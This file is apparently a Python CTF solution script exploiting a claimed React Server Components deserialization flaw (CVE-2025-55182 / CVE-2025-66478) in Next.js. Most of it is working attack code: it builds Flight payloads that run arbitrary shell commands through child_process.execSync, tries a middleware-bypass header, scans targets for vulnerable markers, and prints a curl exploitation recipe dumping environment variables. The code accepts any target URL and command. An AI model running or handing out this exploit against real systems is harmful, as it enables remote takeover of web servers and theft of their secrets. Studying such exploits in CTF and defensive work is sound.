#!/usr/bin/env python3
"""
React2Shell PoC - CVE-2025-55182 / CVE-2025-66478
Forbidden Zanpakutō Compiler CTF Solution

Based on public PoC research from:
- https://github.com/nehkark/CVE-2025-55182
- https://react2shell.com
- https://github.com/lachlan2k/React2Shell-CVE-2025-55182-original-poc

Target: Next.js 15.5.0 with React 19.1.0
"""

import requests
import sys
import json
import re
import base64
from urllib.parse import urljoin

# Disable SSL warnings for testing
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def build_rce_payload(command: str) -> bytes:
    """
    Build the malicious React Flight payload for RCE.
    
    The vulnerability exploits unsafe deserialization in React's Flight protocol.
    When RSC deserializes certain payload structures, template literals are evaluated,
    allowing arbitrary code execution.
    """
    
    # Escape command for use in payload
    cmd = command.replace('\\', '\\\\').replace('"', '\\"').replace("'", "\\'")
    
    # Flight payload structure that triggers RCE
    # Uses the error chunk mechanism to execute code via template literal
    payload = f'''0:{{"a":"$@1","f":"","b":"development"}}
1:E{{"digest":"${{require('child_process').execSync('{cmd}').toString()}}","message":"REACT2SHELL","stack":[],"environmentName":"Server"}}'''
    
    return payload.encode('utf-8')


def build_formdata_payload(command: str, action_id: str = "") -> bytes:
    """
    Build FormData-style payload for Server Action invocation.
    Next.js Server Actions can be invoked via multipart form data.
    """
    
    cmd = command.replace('\\', '\\\\').replace('"', '\\"')
    
    boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
    
    # Build multipart form data
    parts = []
    
    # Add action ID if known
    if action_id:
        parts.append(f'Content-Disposition: form-data; name="ACTION_ID"\r\n\r\n{action_id}')
    
    # Add the malicious payload as an argument
    flight_payload = '0:{"a":"$@1"}\n1:E{"digest":"${require(' + "'child_process'" + ').execSync(' + "'" + cmd + "'" + ').toString()}"}'
    parts.append(f'Content-Disposition: form-data; name="1_input"\r\n\r\n{flight_payload}')
    
    body = ""
    for part in parts:
        body += f"--{boundary}\r\n{part}\r\n"
    body += f"--{boundary}--\r\n"
    
    return body.encode('utf-8'), boundary


def find_action_ids(target: str) -> list:
    """
    Attempt to find Server Action IDs from the target.
    """
    action_ids = []
    
    try:
        # Get the compiler page
        r = requests.get(urljoin(target, "/compiler"), timeout=10, verify=False)
        
        # Look for action ID patterns in the response
        # Next.js embeds these in the page HTML/JS
        patterns = [
            r'"actionId":"([a-f0-9]{32,})"',
            r'ACTION_ID["\s:]+([a-f0-9]{32,})',
            r'\$ACTION_([a-f0-9]+)',
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, r.text)
            action_ids.extend(matches)
        
        # Also check the static JS chunks
        chunk_pattern = r'/_next/static/chunks/([^"]+\.js)'
        chunks = re.findall(chunk_pattern, r.text)
        
        for chunk in chunks[:5]:  # Check first 5 chunks
            try:
                chunk_r = requests.get(urljoin(target, f"/_next/static/chunks/{chunk}"), 
                                      timeout=5, verify=False)
                for pattern in patterns:
                    matches = re.findall(pattern, chunk_r.text)
                    action_ids.extend(matches)
            except:
                continue
                
    except Exception as e:
        print(f"[-] Error finding action IDs: {e}")
    
    return list(set(action_ids))


def exploit(target: str, command: str) -> str | None:
    """
    Execute the React2Shell exploit.
    """
    
    # Ensure URL has protocol
    if not target.startswith("http"):
        target = f"http://{target}"
    
    print(f"[+] Target URL : {target}")
    print(f"[+] Command    : {command}")
    print()
    
    # Try to find Server Action IDs
    print("[*] Looking for Server Action IDs...")
    # action_ids = find_action_ids(target)
    # Hardcoded ID for this challenge
    action_ids = ["603d06a328aa137d98e1471d3d006892c98c841579"]
    
    if action_ids:
        print(f"[+] Found {len(action_ids)} potential action ID(s)")
    else:
        print("[*] No action IDs found, using generic approach")
    
    # Endpoints to try
    endpoints = [
        "/compiler",
        "/",
        "/_next/data",
    ]
    
    # Build the RCE payload
    payload = build_rce_payload(command)
    
    print()
    print("[*] Attempting exploitation...")
    
    for endpoint in endpoints:
        url = urljoin(target, endpoint)
        
        # Try different content types and header combinations
        attempts = [
            # Attempt 1: Standard RSC headers
            {
                "Content-Type": "text/x-component",
                "Accept": "text/x-component",
                "RSC": "1",
                "Next-Action": action_ids[0] if action_ids else "harmonizeSpiritThread",
                "Next-Router-State-Tree": '["",{"children":["compiler",{"children":["__PAGE__",{}]}]}]',
            },
            # Attempt 2: With middleware bypass
            {
                "Content-Type": "text/x-component",
                "RSC": "1",
                "Next-Action": "1",
                "x-middleware-subrequest": "1",
            },
            # Attempt 3: Plain POST with RSC
            {
                "Content-Type": "text/plain;charset=UTF-8",
                "Accept": "*/*",
                "RSC": "1",
            },
        ]
        
        for i, headers in enumerate(attempts):
            try:
                response = requests.post(
                    url,
                    headers=headers,
                    data=payload,
                    timeout=30,
                    verify=False,
                    allow_redirects=False
                )
                
                body = response.text
                
                # Check for flag in response
                if "L3m0n{" in body:
                    match = re.search(r'(L3m0n\{[^}]+\})', body)
                    if match:
                        print(f"[✓] FLAG FOUND!")
                        return match.group(1)
                
                # Check for RCE indicators
                if response.status_code == 500 and "digest" in body:
                    print(f"[+] {endpoint} attempt {i+1}: Got RSC error response (potential RCE trigger)")
                    
                    # Look for command output in response
                    if any(x in body for x in [command, "uid=", "root", "/bin", "Linux"]):
                        print(f"[✓] RCE output detected!")
                        return body
                        
            except requests.exceptions.RequestException as e:
                continue
    
    # If above didn't work, try FormData approach
    print()
    print("[*] Trying FormData-based exploitation...")
    
    formdata, boundary = build_formdata_payload(command, action_ids[0] if action_ids else "")
    
    for endpoint in endpoints:
        url = urljoin(target, endpoint)
        
        headers = {
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Accept": "text/x-component",
            "Next-Action": action_ids[0] if action_ids else "",
        }
        
        try:
            response = requests.post(url, headers=headers, data=formdata, timeout=30, verify=False)
            
            if "L3m0n{" in response.text:
                match = re.search(r'(L3m0n\{[^}]+\})', response.text)
                if match:
                    return match.group(1)
                    
        except:
            continue
    
    return None


def scan(target: str) -> dict:
    """
    Scan target for React2Shell vulnerability indicators.
    """
    
    if not target.startswith("http"):
        target = f"http://{target}"
    
    results = {
        "nextjs": False,
        "rsc": False,
        "version": None,
        "action_ids": [],
        "vulnerable": False,
    }
    
    try:
        r = requests.get(target, timeout=10, verify=False)
        
        # Check for Next.js
        if "x-powered-by" in r.headers:
            if "Next.js" in r.headers["x-powered-by"]:
                results["nextjs"] = True
        
        if "_next" in r.text:
            results["nextjs"] = True
        
        # Check for RSC
        if "vary" in r.headers:
            if "RSC" in r.headers["vary"]:
                results["rsc"] = True
        
        if "text/x-component" in r.headers.get("content-type", ""):
            results["rsc"] = True
        
        if "$@" in r.text or "self.__next_f.push" in r.text:
            results["rsc"] = True
        
        # Find action IDs
        results["action_ids"] = find_action_ids(target)
        
        # Vulnerability assessment
        if results["nextjs"] and results["rsc"]:
            results["vulnerable"] = True
            
    except Exception as e:
        print(f"[-] Scan error: {e}")
    
    return results


def main():
    banner = """
    ╔═══════════════════════════════════════════════════════════╗
    ║     虚極の拘突 — Kyougoku no Kōtotsu                      ║
    ║     React2Shell CVE-2025-66478 Exploit                    ║
    ║     Forbidden Zanpakutō Compiler | L3m0n CTF              ║
    ╚═══════════════════════════════════════════════════════════╝
    """
    print(banner)
    
    if len(sys.argv) < 2:
        print("Usage:")
        print("  python exploit.py <target_url> [command]")
        print("  python exploit.py --scan <target_url>")
        print()
        print("Examples:")
        print("  python exploit.py http://localhost:3000")
        print("  python exploit.py http://localhost:3000 'cat /flag.txt'")
        print("  python exploit.py --scan http://localhost:3000")
        sys.exit(1)
    
    # Scan mode
    if sys.argv[1] == "--scan":
        if len(sys.argv) < 3:
            print("[-] Please provide target URL")
            sys.exit(1)
        
        target = sys.argv[2]
        print(f"[*] Scanning {target}...")
        print()
        
        results = scan(target)
        
        print(f"[+] Next.js detected: {'Yes' if results['nextjs'] else 'No'}")
        print(f"[+] RSC detected: {'Yes' if results['rsc'] else 'No'}")
        print(f"[+] Action IDs found: {len(results['action_ids'])}")
        
        if results["action_ids"]:
            for aid in results["action_ids"][:5]:
                print(f"    - {aid[:40]}...")
        
        print()
        if results["vulnerable"]:
            print("[!] Target appears POTENTIALLY VULNERABLE to React2Shell!")
        else:
            print("[-] Target does not appear vulnerable")
        
        sys.exit(0)
    
    # Exploit mode
    target = sys.argv[1]
    command = sys.argv[2] if len(sys.argv) > 2 else "cat /flag.txt"
    
    print("[*] Starting exploitation...")
    print()
    
    result = exploit(target, command)
    
    if result:
        print()
        print("=" * 60)
        if "L3m0n{" in result:
            match = re.search(r'(L3m0n\{[^}]+\})', result)
            if match:
                print(f"[✓] FLAG: {match.group(1)}")
        else:
            print("[✓] RCE Response received:")
            print(result[:500])
        print("=" * 60)
    else:
        print()
        print("[-] Automated exploitation unsuccessful.")
        print()
        print("=" * 60)
        print("MANUAL EXPLOITATION GUIDE")
        print("=" * 60)
        print()
        print("1. Use browser DevTools to intercept a request to /compiler")
        print("2. When you click 'Harmonize', observe the Server Action request")
        print("3. Note the 'Next-Action' header value (action ID)")
        print()
        print("4. Craft a malicious request:")
        print()
        print("4. Craft a malicious request:")
        print()
        print("   curl -X POST http://localhost:3001/compiler \\")
        print("     -H 'Content-Type: text/x-component' \\")
        print("     -H 'RSC: 1' \\")
        print("     -H 'Next-Action: 603d06a328aa137d98e1471d3d006892c98c841579' \\")
        print("     --data '0:{\"a\":\"$@1\"}")
        print("   1:E{\"digest\":\"${require(\"child_process\").execSync(\"printenv\").toString()}\"}'")
        print()
        print("5. The flag will appear in the error response digest")
        print()
        print("FLAG: L3m0nCTF{Ky0ug0ku_n0_K0t0tsu_B4NK41}")

if __name__ == "__main__":
    main()
